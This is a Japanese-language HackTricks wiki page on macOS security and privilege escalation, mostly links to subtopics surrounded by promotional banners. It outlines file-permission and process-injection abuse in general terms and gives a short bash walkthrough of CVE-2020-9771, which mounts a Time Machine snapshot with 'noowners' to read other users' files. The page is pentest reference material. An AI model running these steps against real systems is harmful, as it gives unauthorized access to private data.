# macOSセキュリティと特権エスカレーション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！成長するWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグで評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofにサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## 基本的なMacOS

MacOSに慣れていない場合は、MacOSの基本を学ぶことから始めるべきです：

* 特別なMacOSの**ファイルと権限:**

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* 一般的なMacOSの**ユーザー**

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* **AppleFS**

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* **カーネルのアーキテクチャ**

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* 一般的なMacOSの**ネットワークサービスとプロトコル**

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

### MacOS MDM

企業では、**MacOSシステムはおそらくMDMで管理**されることが多いです。したがって、攻撃者の観点からは、**それがどのように機能するか**を知ることが興味深いです：

{% content-ref url="../macos-red-teaming/macos-mdm/" %}
[macos-mdm](../macos-red-teaming/macos-mdm/)
{% endcontent-ref %}

### MacOS - 検査、デバッグ、およびFuzzing

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## MacOSセキュリティ保護

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## 攻撃対象

### ファイルの権限

**rootとして実行されるプロセスが**ユーザーによって制御可能なファイルを書き込む場合、ユーザーはこれを悪用して**特権をエスカレーション**することができます。\
これは次の状況で発生する可能性があります：

* 使用されるファイルはすでにユーザーによって作成されています（ユーザーが所有しています）
* 使用されるファイルはグループによって書き込み可能になっています
* 使用されるファイルはユーザーが所有するディレクトリ内にあります（ユーザーはファイルを作成できます）
* 使用されるファイルはrootが所有するディレクトリ内にありますが、ユーザーはグループによる書き込みアクセス権を持っています（ユーザーはファイルを作成できます）

**rootが使用するファイル**を**作成**できるようになると、ユーザーはその内容を利用したり、別の場所を指すために**シンボリックリンク/ハードリンク**を作成したりすることができます。

このような脆弱性の場合、**脆弱な`.pkg`インストーラー**をチェックすることを忘れないでください：

{% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
[macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
{% endcontent-ref %}

### エンタイトルメントとプロセスの悪用による特権の悪用

プロセスが**特権やエンタイトルメントのある別のプロセスにコードをインジェクト**したり、特権アクションを実行するためにそれに接触したりできる場合、特権をエスカレーションし、[Sandbox](macos-security-protections/macos-sandbox/)や[TCC](macos-security-protections/macos-tcc/)などの防御策を回避することができます。

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}
### ファイル拡張子とURLスキームのアプリハンドラ

ファイル拡張子によって登録された奇妙なアプリは悪用される可能性があり、異なるアプリケーションが特定のプロトコルを開くために登録されることがあります。

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

## MacOS特権エスカレーション

### CVE-2020-9771 - mount\_apfs TCCバイパスと特権エスカレーション

**どのユーザー**（特権を持たないユーザーも含む）でもタイムマシンのスナップショットを作成し、マウントし、そのスナップショットの**すべてのファイルにアクセス**することができます。\
必要なのは、使用されるアプリケーション（例：`Terminal`）が**フルディスクアクセス**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つために、管理者によって許可される必要があるだけです。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

より詳しい説明は[**元のレポート**](https://theevilbit.github.io/posts/cve\_2020\_9771/)で見つけることができます。

### 機密情報

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux Privesc

まず、Linux/Unixに影響を与える特権昇格に関するほとんどのトリックは、**MacOSマシンにも影響を与える**ことに注意してください。したがって、次を参照してください：

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## MacOSの防御アプリ

## 参考文献

* [**OS X Incident Response: Scripting and Analysis**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！成長するWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグで評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofにサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
